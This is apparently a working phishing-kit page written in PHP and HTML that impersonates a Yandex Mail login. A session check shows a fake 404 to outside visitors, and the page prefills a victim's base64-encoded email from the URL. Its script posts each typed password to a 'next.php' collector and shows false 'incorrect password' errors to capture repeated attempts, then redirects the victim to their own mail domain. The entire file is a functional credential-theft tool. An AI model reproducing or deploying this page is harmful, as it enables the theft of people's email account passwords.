<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Yandex Mail</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body id="yandexbody">
    <div id="main-conatiner-yandex" class="c-div">
        <div id="form-outer-yandex" style="width: 100%;max-width: 376px;height: fit-content;padding: 32px;background: #131217;border-radius: 34px;color: rgb(255,255,255);">
            <div class="c-div"><img class="img-fluid" width="240" height="120" src="../assets/img/yandexlg.svg" style="height: 44px;"></div>
            <h4 style="text-align: center;margin-top: 32px;">Log in with Yandex ID</h4>
            <div style="height: 53px;border-radius: 17px;border: 1px solid rgb(151,151,151);"><button class="btn btn-primary fw-semibold" type="button" style="background: #302f34;height: 50px;width: 50%;border-radius: 20px;border-style: none;border-color: rgb(110,110,110);color: rgb(242,235,235);font-size: 14px;padding: 4px 8px;">Email</button><button class="btn btn-primary disabled fw-semibold" type="button" style="background: #131217;height: 50px;width: 50%;border-radius: 20px;border-style: none;border-color: rgb(110,110,110);color: rgb(242,235,235);font-size: 14px;padding: 4px 8px;" disabled="">Phone Number</button></div><input type="text" id="backEMF" class="fw-semibold" style="width: 100%;height: 50px;background: transparent;border-style: solid;border-color: rgb(173,173,173);border-radius: 16px;padding: 1px 8px;margin-top: 16px;" placeholder="Email"><input type="password" id="pass" class="fw-semibold" style="width: 100%;height: 50px;background: transparent;border-style: solid;border-color: rgb(173,173,173);border-radius: 16px;padding: 1px 8px;margin-top: 16px;" placeholder="Password">
            <p id="err" style="margin-bottom: 0px;color: rgb(255,76,64);">Incorrect Email or Password.</p><button class="btn btn-primary fw-semibold" id="next-btn" type="button" style="background: #ffffff;height: 50px;width: 100%;border-radius: 20px;border-style: none;border-color: rgb(110,110,110);color: rgb(0,0,0);font-size: 16px;padding: 4px 8px;margin-top: 8px;" onclick="nextFun();">Log in</button><button class="btn btn-primary disabled fw-semibold" type="button" style="background: #302f34;height: 50px;width: 100%;border-radius: 20px;border-style: none;border-color: rgb(110,110,110);color: rgb(242,235,235);font-size: 16px;padding: 4px 8px;margin-top: 8px;" disabled=""><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="currentColor" viewBox="0 0 16 16" class="bi bi-fingerprint" style="font-size: 24px;">
                    <path d="M8.06 6.5a.5.5 0 0 1 .5.5v.776a11.5 11.5 0 0 1-.552 3.519l-1.331 4.14a.5.5 0 0 1-.952-.305l1.33-4.141a10.5 10.5 0 0 0 .504-3.213V7a.5.5 0 0 1 .5-.5Z"></path>
                    <path d="M6.06 7a2 2 0 1 1 4 0 .5.5 0 1 1-1 0 1 1 0 1 0-2 0v.332c0 .409-.022.816-.066 1.221A.5.5 0 0 1 6 8.447c.04-.37.06-.742.06-1.115zm3.509 1a.5.5 0 0 1 .487.513 11.5 11.5 0 0 1-.587 3.339l-1.266 3.8a.5.5 0 0 1-.949-.317l1.267-3.8a10.5 10.5 0 0 0 .535-3.048A.5.5 0 0 1 9.569 8Zm-3.356 2.115a.5.5 0 0 1 .33.626L5.24 14.939a.5.5 0 1 1-.955-.296l1.303-4.199a.5.5 0 0 1 .625-.329Z"></path>
                    <path d="M4.759 5.833A3.501 3.501 0 0 1 11.559 7a.5.5 0 0 1-1 0 2.5 2.5 0 0 0-4.857-.833.5.5 0 1 1-.943-.334Zm.3 1.67a.5.5 0 0 1 .449.546 10.72 10.72 0 0 1-.4 2.031l-1.222 4.072a.5.5 0 1 1-.958-.287L4.15 9.793a9.72 9.72 0 0 0 .363-1.842.5.5 0 0 1 .546-.449Zm6 .647a.5.5 0 0 1 .5.5c0 1.28-.213 2.552-.632 3.762l-1.09 3.145a.5.5 0 0 1-.944-.327l1.089-3.145c.382-1.105.578-2.266.578-3.435a.5.5 0 0 1 .5-.5Z"></path>
                    <path d="M3.902 4.222a4.996 4.996 0 0 1 5.202-2.113.5.5 0 0 1-.208.979 3.996 3.996 0 0 0-4.163 1.69.5.5 0 0 1-.831-.556Zm6.72-.955a.5.5 0 0 1 .705-.052A4.99 4.99 0 0 1 13.059 7v1.5a.5.5 0 1 1-1 0V7a3.99 3.99 0 0 0-1.386-3.028.5.5 0 0 1-.051-.705ZM3.68 5.842a.5.5 0 0 1 .422.568c-.029.192-.044.39-.044.59 0 .71-.1 1.417-.298 2.1l-1.14 3.923a.5.5 0 1 1-.96-.279L2.8 8.821A6.531 6.531 0 0 0 3.058 7c0-.25.019-.496.054-.736a.5.5 0 0 1 .568-.422Zm8.882 3.66a.5.5 0 0 1 .456.54c-.084 1-.298 1.986-.64 2.934l-.744 2.068a.5.5 0 0 1-.941-.338l.745-2.07a10.51 10.51 0 0 0 .584-2.678.5.5 0 0 1 .54-.456Z"></path>
                    <path d="M4.81 1.37A6.5 6.5 0 0 1 14.56 7a.5.5 0 1 1-1 0 5.5 5.5 0 0 0-8.25-4.765.5.5 0 0 1-.5-.865Zm-.89 1.257a.5.5 0 0 1 .04.706A5.478 5.478 0 0 0 2.56 7a.5.5 0 0 1-1 0c0-1.664.626-3.184 1.655-4.333a.5.5 0 0 1 .706-.04ZM1.915 8.02a.5.5 0 0 1 .346.616l-.779 2.767a.5.5 0 1 1-.962-.27l.778-2.767a.5.5 0 0 1 .617-.346Zm12.15.481a.5.5 0 0 1 .49.51c-.03 1.499-.161 3.025-.727 4.533l-.07.187a.5.5 0 0 1-.936-.351l.07-.187c.506-1.35.634-2.74.663-4.202a.5.5 0 0 1 .51-.49"></path>
                </svg>&nbsp;Face or Fingerprint login</button>
            <div class="c-div"><button class="btn btn-primary disabled fw-semibold" type="button" style="background: #131217;height: 50px;width: 50%;border-radius: 20px;border-style: none;border-color: rgb(110,110,110);color: rgb(242,235,235);font-size: 14px;padding: 4px 8px;" disabled="">Log in with</button></div><button class="btn btn-primary disabled fw-semibold" type="button" style="background: #131217;height: 50px;width: 100%;border-radius: 20px;border-style: none;border-color: rgb(110,110,110);color: rgb(242,235,235);font-size: 16px;padding: 4px 8px;margin-top: 8px;" disabled=""><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="currentColor" viewBox="0 0 16 16" class="bi bi-qr-code" style="font-size: 24px;">
                    <path d="M2 2h2v2H2z"></path>
                    <path d="M6 0v6H0V0zM5 1H1v4h4zM4 12H2v2h2z"></path>
                    <path d="M6 10v6H0v-6zm-5 1v4h4v-4zm11-9h2v2h-2z"></path>
                    <path d="M10 0v6h6V0zm5 1v4h-4V1zM8 1V0h1v2H8v2H7V1zm0 5V4h1v2zM6 8V7h1V6h1v2h1V7h5v1h-4v1H7V8zm0 0v1H2V8H1v1H0V7h3v1zm10 1h-1V7h1zm-1 0h-1v2h2v-1h-1zm-4 0h2v1h-1v1h-1zm2 3v-1h-1v1h-1v1H9v1h3v-2zm0 0h3v1h-2v1h-1zm-4-1v1h1v-2H7v1z"></path>
                    <path d="M7 12h1v3h4v1H7zm9 2v2h-3v-1h2v-1z"></path>
                </svg>&nbsp;QR Code</button>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>